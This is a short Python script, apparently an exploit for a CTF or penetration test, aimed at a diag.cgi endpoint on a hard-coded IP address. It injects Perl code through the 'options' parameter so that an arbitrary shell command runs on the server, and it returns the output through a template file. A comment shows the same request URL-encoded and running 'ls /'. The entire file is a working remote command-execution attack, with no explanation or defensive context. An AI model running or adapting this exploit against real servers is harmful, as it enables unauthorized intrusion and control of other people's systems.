import requests
import sys

server = "http://13.231.137.9/cgi-bin/diag.cgi"

my = "ptest123"
option = "-r '$x=\"%s\",system$x#'  2> tmp/%s.thtml <"

#http://13.231.137.9/cgi-bin/diag.cgi?options=-r+%27%24x%3D%22ls+/%22%2Csystem%24x%23%27++2%3E+tmp/ptest123.thtml+%3C&tpl=ptest123

if __name__ == "__main__":
    cmd = "id"
    if len(sys.argv) >= 2:
        cmd = sys.argv[1]
    
    p = {"options": option % (cmd, my), "tpl": my}
    print(requests.get(server, params = p).text)
